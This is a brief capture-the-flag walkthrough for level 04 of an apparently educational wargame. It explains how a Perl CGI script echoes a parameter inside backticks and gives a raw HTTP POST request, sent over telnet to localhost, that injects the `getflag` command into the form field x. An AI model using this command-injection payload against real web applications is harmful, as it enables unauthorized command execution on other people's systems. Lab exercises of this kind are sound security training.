on level 04 we have access to a perl cgi script that is owned by the flag04 user. The script takes an argument x and will print `echo $y 2>&1`
similarly to level03, if we manage to use this cgi script to execute the getflag command, we should be able to get the flag00
we also see in the perl script that it is set up for localhost on port 4747
We can therefore use telnet to connect to localhost on port 4747: telnet localhost 4747
and send a post request with the value of x as `getflag` (with backticks so that is is interpreted as a command by perl)

POST /level04.pl HTTP/1.1
Host: localhost
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

x=`getflag`

And we manage to directly recover the flag
